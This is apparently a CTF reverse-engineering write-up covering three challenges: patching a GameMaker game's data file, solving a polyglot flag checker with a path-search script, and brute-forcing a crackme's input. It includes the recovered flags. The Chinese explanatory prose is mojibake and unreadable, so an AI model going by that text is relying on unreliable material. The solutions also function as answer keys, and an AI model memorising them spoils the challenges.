<h2 id="flag-finder-GMé€†å‘"><a href="#flag-finder-GMé€†å‘" class="headerlink" title="flag-finder | GMé€†å‘"></a><strong>flag-finder</strong> | GMé€†å‘</h2><p>æ–‡ä»¶åŒ…å«data.win è¯´æ˜æ˜¯ä½¿ç”¨GameMakerç¼–å†™çš„æ¸¸æˆ äºŒè¿›åˆ¶æ–‡ä»¶åªåŒ…å«çª—å£æ¶ˆæ¯çš„å¤„ç†ç­‰æœ€åº•å±‚çš„é€»è¾‘ æ‰€ä»¥æ²¡å¿…è¦å¤ªä»”ç»†åˆ†æ ç”¨ç›®å‰æœ€å¥½çš„GMè§£åŒ…åº”ç”¨UndertaleModToolè§£åŒ…data.win</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-205719.png" alt="image-20240223205719675"></p>
<p>æ¸¸æˆçš„ç›®æ ‡æ˜¯æ‰¾åˆ°key ä½†æ˜¯åœ°å›¾ä¸Šæ‰¾ä¸åˆ° æ ¹æ®æç¤ºkeyä¸€å®šåœ¨è¿™ä¸ª<code>room</code>ä¸­ </p>
<p>åœ¨æ¸¸æˆRoomsä¸­æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªå®ä¾‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-210214.png" alt="image-20240223210214778"></p>
<p>å¯¹åº”ç”Ÿæˆä½ç½®:<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-210252.png" alt="image-20240223210252760"></p>
<p>è¶…å‡ºäº†åœ°å›¾ç©ºæ°”å¢™èŒƒå›´ æŸ¥çœ‹flagæ‰€åœ¨ä½ç½®å¹¶å°†keyä¿®æ”¹åˆ°ç›¸è¿‘ä½ç½® UndertaleModToolæ”¯æŒç›´æ¥è¿è¡Œä¿®æ”¹åçš„data.win å®Œæˆä»»åŠ¡å¾—åˆ°flag:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-210545.png" alt="image-20240223210545560"></p>
<h2 id="glottem-algre"><a href="#glottem-algre" class="headerlink" title="glottem | algre"></a><strong>glottem</strong> | algre</h2><p>æ˜æ–‡ ç›´æ¥notepadæ‰“å¼€:</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="params">#</span>!/bin/sh</span><br><span class="line">1&lt;&lt;4201337</span><br><span class="line">1//1,&quot;&quot;&quot;</span><br><span class="line">exit=process.exit;argv=process.argv.slice(1)/*</span><br><span class="line">4201337</span><br><span class="line">read -p &quot;flag? &quot; flag</span><br><span class="line">node <span class="built_in">$</span>0 &quot;<span class="built_in">$</span>flag&quot; <span class="built_in">&amp;</span><span class="built_in">&amp;</span> python3 <span class="built_in">$</span>0 &quot;<span class="built_in">$</span>flag&quot; <span class="built_in">&amp;</span><span class="built_in">&amp;</span> echo correct || echo incorrect</span><br><span class="line">1&lt;&lt;4201337</span><br><span class="line">*///&quot;&quot;&quot;;from sys import argv</span><br><span class="line">e = [[[...], ...], ...]</span><br><span class="line">alpha=&quot;abcdefghijklmnopqrstuvwxyz<span class="built_in">_</span>&quot;</span><br><span class="line">d=0;s=argv[1];1//1;&quot;&quot;&quot;</span><br><span class="line">/*&quot;&quot;&quot;</span><br><span class="line"><span class="params">#</span>*/for (let i = 0; i &lt; s.length; i ++) &#123;/*</span><br><span class="line">for i in range(6,len(s)-2):</span><br><span class="line">    <span class="params">#</span>*/d=(d*31+s.charCodeAt(i))<span class="comment">%93097/*</span></span><br><span class="line">    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]<span class="params">#</span>*/&#125;</span><br><span class="line">exit(+(d!=260,[d!=61343])[0])</span><br><span class="line">4201337</span><br></pre></td></tr></table></figure>

<p>æ•°æ®eè¿‡é•¿ä¸å±•ç¤º è¿™ä¸ªæ–‡ä»¶æƒ³è¡¨è¾¾çš„æ„æ€åº”è¯¥æ˜¯è¾“å…¥çš„flagè¦åˆ†åˆ«æ»¡è¶³pythonå±•ç¤ºçš„ä»£ç å’Œæ³¨é‡Šèµ·æ¥çš„javaä»£ç  javaçš„é€»è¾‘å¾ˆå¥½ç†è§£ pythonä»£ç çš„æ„æ€æ˜¯ä¿è¯flagå†…å®¹ä¸­å½“å‰å­—ç¬¦çš„ä½ç½®ä½œä¸º1çº§ç´¢å¼•æ¥ç¡®å®šâ€å±‚â€ å½“å‰å­—ç¬¦åœ¨è¡¨ä¸­çš„ä½ç½®ä½œä¸º2çº§ç´¢å¼•ç¡®å®šåœ¨å±‚ä¸­çš„â€æ®µâ€ å½“å‰å­—ç¬¦çš„åä¸€ä¸ªå­—ç¬¦åœ¨è¡¨ä¸­çš„ä½ç½®ä¸º3çº§ç´¢å¼•ä»â€æ®µâ€ä¸­é€‰å–åŠ æ•° é¢˜ç›®æç¤ºflagé•¿åº¦34 å»æ‰lactf{}åä¸º26 è€Œæœ€ådå°±æ˜¯è¦ä¸260æ ¡éªŒ pythonç®€å•å†™ä¸ªç¨‹åºå‘ç°eä¸­æœ€å°çš„æ•°å°±æ˜¯10 æ‰€ä»¥ç›®æ ‡å°±æ˜¯æ‰¾åˆ°0~25å±‚ä¹‹é—´æ‰€æœ‰<code>10</code>çš„é€šè·¯ ç»“åˆjavaä»£ç çš„é€»è¾‘æœ€åå†™å‡ºè„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = [[[...], ...], ...]</span><br><span class="line"><span class="comment"># ind = []</span></span><br><span class="line"><span class="comment"># for _ in range(26):</span></span><br><span class="line"><span class="comment">#     for __ in range(len(e[_])):</span></span><br><span class="line"><span class="comment">#         for ___ in range(len(e[_][__])):</span></span><br><span class="line"><span class="comment">#             if e[_][__][___] == 10:</span></span><br><span class="line"><span class="comment">#                 ind.append([_,__,___])</span></span><br><span class="line"><span class="comment"># print(ind)</span></span><br><span class="line"></span><br><span class="line">alpha=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_paths</span>(<span class="params">node_list</span>):</span><br><span class="line">    paths = []</span><br><span class="line">    stack = []</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> node_list:</span><br><span class="line">        <span class="keyword">if</span> node[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            stack.append([node])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        path = stack.pop()</span><br><span class="line">        current_node = path[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_node[<span class="number">0</span>] == <span class="number">25</span>:</span><br><span class="line">            paths.append(path)</span><br><span class="line">        visited.clear()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> node_list:</span><br><span class="line">            <span class="keyword">if</span> node[<span class="number">0</span>] == current_node[<span class="number">0</span>] + <span class="number">1</span> <span class="keyword">and</span> node[<span class="number">1</span>] == current_node[<span class="number">2</span>]:</span><br><span class="line">                <span class="keyword">if</span> node <span class="keyword">not</span> <span class="keyword">in</span> path:</span><br><span class="line">                    new_path = <span class="built_in">list</span>(path)</span><br><span class="line">                    new_path.append(node)</span><br><span class="line">                    stack.append(new_path)</span><br><span class="line">                    visited.add(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br><span class="line"></span><br><span class="line">node_list = [(...), ...]</span><br><span class="line"></span><br><span class="line">paths = find_paths(node_list)</span><br><span class="line">flags = []</span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">    flags.append(<span class="string">&quot;lactf&#123;&quot;</span> + <span class="string">&quot;&quot;</span>.join([alpha[node[<span class="number">1</span>]] <span class="keyword">for</span> node <span class="keyword">in</span> path]) + alpha[path[-<span class="number">1</span>][<span class="number">2</span>]] + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> flags:</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        d = (<span class="number">31</span> * d + <span class="built_in">ord</span>(each)) % <span class="number">93097</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">61343</span>:</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># lactf&#123;solve_one_get_two_free_deal&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="meow-meow-çˆ†ç ´"><a href="#meow-meow-çˆ†ç ´" class="headerlink" title="meow meow | çˆ†ç ´"></a><strong>meow meow</strong> | çˆ†ç ´</h2><p>é™„ä»¶ç»™äº†7ä¸ªå¾ˆå¤§çš„dataæ–‡ä»¶ å…ˆçœ‹äºŒè¿›åˆ¶æ–‡ä»¶ DIEæŸ¥å£³ æ— å£³64x IDA64æ‰“å¼€:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">6</span>]; <span class="comment">// [rsp+Ah] [rbp-1A6h] BYREF</span></span><br><span class="line">  __int64 *proc_1[<span class="number">12</span>]; <span class="comment">// [rsp+10h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+70h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+80h] [rbp-130h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+88h] [rbp-128h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+90h] [rbp-120h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+98h] [rbp-118h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+A0h] [rbp-110h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+A8h] [rbp-108h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+B0h] [rbp-100h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+B8h] [rbp-F8h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+C0h] [rbp-F0h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+C8h] [rbp-E8h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+D0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+D8h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+E0h] [rbp-D0h]</span></span><br><span class="line">  __int64 input_proc[<span class="number">2</span>]; <span class="comment">// [rsp+F0h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+100h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+190h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+194h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+198h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+19Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  *s = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  v19 = <span class="number">0LL</span>;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0LL</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(proc_1, <span class="number">0</span>, <span class="keyword">sizeof</span>(proc_1));</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Meow Meow? &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">95</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) % <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = i;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = trans(s[i]);</span><br><span class="line">      *(proc_1 + i) = v4;                       <span class="comment">// lowercase-&gt;&#x27;a&#x27; offset</span></span><br><span class="line">                                                <span class="comment">// _ -&gt;26</span></span><br><span class="line">                                                <span class="comment">// &#123; -&gt;27</span></span><br><span class="line">                                                <span class="comment">// &#125; -&gt;28</span></span><br><span class="line">      <span class="keyword">if</span> ( *(proc_1 + i) == <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(name, <span class="string">&quot;data0&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = j;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt;= <span class="built_in">strlen</span>(s) / <span class="number">5</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++name[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( access(name, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = <span class="number">0</span>;</span><br><span class="line">          v24 = <span class="number">0</span>;</span><br><span class="line">          input_proc[<span class="number">0</span>] = s;</span><br><span class="line">          input_proc[<span class="number">1</span>] = proc_1;</span><br><span class="line">          GOMP_parallel(func, input_proc, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">          v25 = v24;</span><br><span class="line">          <span class="keyword">if</span> ( v24 == <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;MEOW&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">999</span>; ++k )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">putchar</span>(<span class="number">33</span>);</span><br><span class="line">              fflush(<span class="built_in">stdout</span>);</span><br><span class="line">              usleep(<span class="number">0x3E8</span>u);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Woof.....&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">4LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++name[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">if</span> ( access(name, <span class="number">0</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;WOOOOOOOF BARK BARK BARK&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: make sure you have downloaded and extracted the data.zip files into the same folder as the executable.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥çš„é•¿åº¦ä¸º5n ä½¿ç”¨GOMP_parallelåˆ›å»ºäº†funcçš„çº¿ç¨‹ func:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_55811199B67A</span><span class="params">(__int64 input_proc)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">int</span> num_threads; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> thread_num; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> buf[<span class="number">29</span>]; <span class="comment">// [rsp+10h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> file[<span class="number">4</span>]; <span class="comment">// [rsp+85h] [rbp-2Bh] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+89h] [rbp-27h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+8Bh] [rbp-25h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+8Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> key; <span class="comment">// [rsp+94h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [rsp+9Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(*input_proc) / <span class="number">5</span>;</span><br><span class="line">  num_threads = omp_get_num_threads();</span><br><span class="line">  thread_num = omp_get_thread_num();</span><br><span class="line">  v4 = v1 / num_threads;</span><br><span class="line">  v5 = v1 % num_threads;</span><br><span class="line">  <span class="keyword">if</span> ( thread_num &lt; v1 % num_threads )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = v4 * thread_num + v5;</span><br><span class="line">  v7 = v6 + v4;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt; v6 + v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = v6;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *file = <span class="number">0x61746164</span>;</span><br><span class="line">      v11 = (v16 + <span class="number">49</span>);</span><br><span class="line">      fd = open(file, <span class="number">0</span>);</span><br><span class="line">      key = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        lseek(fd, (<span class="number">0x74</span> * key), <span class="number">0</span>);</span><br><span class="line">        v12 = *(*(input_proc + <span class="number">8</span>) + <span class="number">5</span> * v16 + i);<span class="comment">// key = 0</span></span><br><span class="line">                                                <span class="comment">// loop(0, 5):</span></span><br><span class="line">                                                <span class="comment">//    offset += key * 0x74</span></span><br><span class="line">                                                <span class="comment">//    key = data[offset + proc[5 * n + i]]</span></span><br><span class="line">                                                <span class="comment">//    offset += 0x74</span></span><br><span class="line">        read(fd, buf, <span class="number">0x74</span>uLL);</span><br><span class="line">        key = buf[v12];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( key == <span class="number">0x63617400</span> )</span><br><span class="line">        ++v17;</span><br><span class="line">      ++v16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v16 &lt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = v17;</span><br><span class="line">  _InterlockedAdd((input_proc + <span class="number">16</span>), v17);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5 bytesä¸€ç»„ç”¨è¾“å…¥æ¥æ§åˆ¶æ–‡ä»¶æŒ‡é’ˆ è¦æ±‚æœ€åè¯»åˆ°çš„æ•°æ®ä¸­æŸå¤„æ˜¯0x63617400(<code>cat\x0</code>) ä¸çŸ¥é“æ€ä¹ˆé€†å‘è®¡ç®—å‡ºè¿™5 bytes ç›´æ¥çˆ†ç ´:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// for(int _ = 1; _ &lt;= 7; _++)&#123;</span></span><br><span class="line">    <span class="comment">//     string data = &quot;data&quot; + to_string(_);</span></span><br><span class="line">    <span class="comment">//     auto fd = open(data.c_str(), 0);</span></span><br><span class="line">    <span class="comment">//     int table[] = &#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28&#125;;</span></span><br><span class="line">    <span class="comment">//     for(int a : table)&#123;</span></span><br><span class="line">    <span class="comment">//         bool f = 0;</span></span><br><span class="line">    <span class="comment">//         for(int b : table)&#123;</span></span><br><span class="line">    <span class="comment">//             for(int c : table)&#123;</span></span><br><span class="line">    <span class="comment">//                 for(int d : table)&#123;</span></span><br><span class="line">    <span class="comment">//                     for(int e : table)&#123;</span></span><br><span class="line">    <span class="comment">//                         int key = 0;</span></span><br><span class="line">    <span class="comment">//                         int buf[29];</span></span><br><span class="line">    <span class="comment">//                         int temp[5] = &#123;a, b, c, d, e&#125;;</span></span><br><span class="line">    <span class="comment">//                         for(int __ = 0; __ &lt;= 4; __++)&#123;</span></span><br><span class="line">    <span class="comment">//                             lseek(fd, 0x74 * key, 0);</span></span><br><span class="line">    <span class="comment">//                             int v = temp[__];</span></span><br><span class="line">    <span class="comment">//                             read(fd, buf, 0x74);</span></span><br><span class="line">    <span class="comment">//                             key = buf[v];</span></span><br><span class="line">    <span class="comment">//                         &#125;</span></span><br><span class="line">    <span class="comment">//                         if(key == 0x63617400)&#123;</span></span><br><span class="line">    <span class="comment">//                             printf(&quot;&#123;%d, %d, %d, %d, %d&#125;,\n&quot;, a, b, c, d, e);</span></span><br><span class="line">    <span class="comment">//                             f = 1;</span></span><br><span class="line">    <span class="comment">//                             break;</span></span><br><span class="line">    <span class="comment">//                         &#125;</span></span><br><span class="line">    <span class="comment">//                     &#125;</span></span><br><span class="line">    <span class="comment">//                     if(f) break;</span></span><br><span class="line">    <span class="comment">//                 &#125;</span></span><br><span class="line">    <span class="comment">//                 if(f) break;</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">    <span class="comment">//             if(f) break;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//         if(f) break;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     close(fd);</span></span><br><span class="line">    <span class="comment">//     printf(&quot;====================\n&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="type">char</span> alpha_table[<span class="number">29</span>] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">int</span> flag_pieces[<span class="number">7</span>][<span class="number">5</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">5</span>&#125;,</span><br><span class="line">            &#123;<span class="number">27</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">22</span>&#125;,</span><br><span class="line">            &#123;<span class="number">26</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">26</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">3</span>&#125;,</span><br><span class="line">            &#123;<span class="number">26</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">15</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">7</span>&#125;,</span><br><span class="line">            &#123;<span class="number">13</span>, <span class="number">23</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">28</span>&#125;,</span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, alpha_table[flag_pieces[i][j]]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// lactf&#123;meow_you_found_me_epcsihnxos&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´èŠ±äº†5minså·¦å³ ä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯é¢„æœŸè§£ å¾—åˆ°çš„flagç‰‡æ®µåˆšå¥½å°±æ˜¯æŒ‰é¡ºåºæ’åˆ—çš„ è¯´æ˜GOMP_parallelå‡½æ•°äº§ç”Ÿçš„çº¿ç¨‹çš„idå°±æ˜¯ä»0å¼€å§‹é€’å¢è€Œä¸æ˜¯éšæœºçš„</p>
<h2 id="rbp-å‡½æ•°æ§åˆ¶"><a href="#rbp-å‡½æ•°æ§åˆ¶" class="headerlink" title="rbp | å‡½æ•°æ§åˆ¶"></a><strong>rbp</strong> | å‡½æ•°æ§åˆ¶</h2><p>DIEæŸ¥å£³ æ— å£³64x IDA64æ‰“å¼€:</p>
